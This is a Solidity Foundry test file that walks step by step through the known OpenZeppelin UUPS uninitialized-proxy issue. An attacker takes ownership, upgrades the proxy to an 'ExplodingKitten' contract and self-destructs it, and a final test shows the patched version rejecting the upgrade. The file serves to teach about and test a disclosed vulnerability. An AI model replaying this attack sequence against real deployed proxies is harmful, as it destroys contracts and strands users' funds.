// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {UUPSProxy} from "./UUPSProxy.sol";
import {SimpleToken} from "./SimpleToken.sol";
import {SimpleTokenV2} from "./SimpleTokenV2.sol";
import {SimpleTokenFixed} from "./SimpleTokenFixed.sol";
import {ExplodingKitten} from "./ExplodingKitten.sol";

// These tests not only demonstrate the combination of delegatecall with selfdestruct
// but they also attempt to demonstrate an OpenZeppelin "security issue" when a proxy is left uninitialized
// In short, initialize your UUPS proxy implementation and all is well
// Github security issue: https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/security/advisories/GHSA-q4h9-46xg-m3x9
// Original PoC: https://github.com/yehjxraymond/exploding-kitten

contract UUPS_selfdestruct is Test {
    // These contracts are from https://github.com/yehjxraymond/exploding-kitten
    // referenced by this post-mortem https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680
    // Some ideas for foundry tests are from https://github.com/FredCoen/Proxy_implementations_with_forge/blob/main/src/test/UUPSProxy.t.sol
    SimpleToken public tokenV1;
    SimpleTokenV2 public tokenV2;
    ExplodingKitten public kittenAddress;
    SimpleTokenFixed public fixedtoken;
    UUPSProxy public proxy;
    UUPSProxy public proxyfixed;

    address public alice;
    address public emptyAddress;
    address public deployer;

    function setUp() public {
        alice = address(0xABCD);
        emptyAddress = address(0xb8b3dbc6);
        deployer = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;

        // Deploy initial logic and proxy contract
        tokenV1 = new SimpleToken(); // Deploy logic contract
        proxy = new UUPSProxy(address(tokenV1), ""); // Deploy ERC1967 proxy contract with tokenV1 logic as implementation

        // deploy the new V2 contract version, which is used in some tests
        vm.prank(address(alice));
        tokenV2 = new SimpleTokenV2();

        // Alice deploys exploit PoC
        vm.prank(address(alice));
        kittenAddress = new ExplodingKitten(); // Deploy PoC contract

        // deploy the fixed token contract and use in proxy deployment with newer OZ imports
        fixedtoken = new SimpleTokenFixed();
        proxyfixed = new UUPSProxy(address(fixedtoken), ""); // Deploy ERC1967 proxy contract with fixedtoken logic as implementation
    }

    // Step 1: Initialize the proxy and verify the owner is this contract
    // This is the "ideal" scenario because the proper owner remembered to properly initialize the contract
    function testProxyInitialize() public {
        (bool s, bytes memory returnedData) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(s);
        (s, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(s);
        address owner = abi.decode(returnedData, (address));

        // owner of UUPSProxy contract should be this contract
        assertEq(owner, address(this));
    }

    // Step 2: Initialize proxy as Alice and verify the owner is Alice
    // The owner forgot to initialize the proxy so the first step for the attacker is to become the owner
    function testAliceProxyInitialize() public {
        vm.prank(address(alice));
        (bool s, bytes memory returnedData) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(s);
        (s, returnedData) = address(proxy).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(s);
        address owner = abi.decode(returnedData, (address));

        // owner of UUPSProxy contract is alice
        assertEq(owner, address(alice));
    }

    // Step 3: Initialize proxy as and upgrading the contract to tokenV2
    // Alice goes one step further and upgrades the implementation contract after becoming the proxy owner
    function testAliceV2Upgrade() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to new implementation contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(tokenV2))
        );
        assertTrue(a);

        // Confirm logic contract upgrade by calling version()
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("version()")
        );
        string memory verNum = abi.decode(data, (string));
        assertEq(verNum, "v2");
        assertEq(tokenV2.version(), "v2");

        // Confirm logic contract upgrade by calling mint() and then confirming balanceOf()
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("mint(address,uint256)", address(alice), 1000)
        );
        assertTrue(a);
        // Now check that Alice's balance is 1000, to match the previous minting action
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("balanceOf(address)", address(alice))
        );
        assertTrue(a);
        uint256 aliceBalance = abi.decode(data, (uint256));
        assertEq(aliceBalance, 1000);
    }

    // Step 4: Case of Alice initializing the UUPS proxy and upgrading the contract to the PoC contract
    // Alice upgrades the implementation contract not to a benign contract, but the exploding kitten contract
    function testAlicePoCDemo() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to PoC contract
        // Should be possible to do the next 2 steps in 1 step with upgradeToAndCall(), but this was easier to debug and make work
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(kittenAddress))
        );
        assertTrue(a);

        // update proxy to PoC contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("explode()")
        );
        assertTrue(a);

        // The proxy cannot be used for any future upgrades at this point
    }

    // Step 5: Case of Alice initializing the UUPS proxy and upgrading the contract to the PoC contract, then showing it cannot be upgraded further
    // This is where all the pieces are put together and the issue is exposed - no further upgrades can be made
    function testFailAlicePoCFirstThenTryV2Upgrade() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxy).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);

        // update proxy to PoC contract
        // Should be possible to do the next 2 steps in 1 step with upgradeToAndCall(), but this was easier to debug and make work
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(kittenAddress))
        );
        assertTrue(a);

        // Call explode() in PoC contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("explode()")
        );
        assertTrue(a);

        // Attempt to update proxy to tokenV2 contract
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("upgradeTo(address)", address(tokenV2))
        );
        assertTrue(a); // call returns true because it's the same as calling an address without code

        // Attempt to call version(), but it fails because tokenV2 is not used
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("version()")
        );
        assertTrue(a);

        // Attempt to call return42(), but this too fails
        vm.prank(address(alice));
        (a, data) = address(proxy).call(
            abi.encodeWithSignature("return42()")
        );
        assertTrue(a);
    }

    // Step 6: Case of Alice initializing the UUPS proxy and upgrading the contract to the PoC contract, but encountering an error
    // The fix in OZ 4.3.2 was to add an onlyProxy() modifier so initialize() is only called through the proxy, and not called directly (when it would have no effect)
    // But a different error is encountered here because we are using an even newer OpenZeppelin version which has more security
    // Basic lesson: Remember to initialize any UUPS proxy implementation!
   function testFixedProxyWithPoC() public {
        // first, initialize
        vm.prank(address(alice));
        (bool a, bytes memory data) = address(proxyfixed).call(abi.encodeWithSignature("initialize()"));
        assertTrue(a);
        
        (a, data) = address(proxyfixed).call(
            abi.encodeWithSignature("owner()")
        );
        assertTrue(a);
        address owner = abi.decode(data, (address));
        // owner of UUPSProxy contract should be this contract
        assertEq(owner, address(alice));

        // update proxy to PoC contract
        // Should be possible to do the next 2 steps in 1 step with upgradeToAndCall(), but this was easier to debug and make work
        vm.prank(address(alice));
        // ERC1967 upgrade process rely on EIP1822 after PR 3021 (https://github.com/OpenZeppelin/openzeppelin-contracts/pull/3021), causing kitten upgrade to procude an error of "ERC1967Upgrade: new implementation is not UUPS"
        vm.expectRevert();
        (a, data) = address(proxyfixed).call(
            abi.encodeWithSignature("upgradeTo(address)", address(kittenAddress))
        );
        assertTrue(a);
    }
}
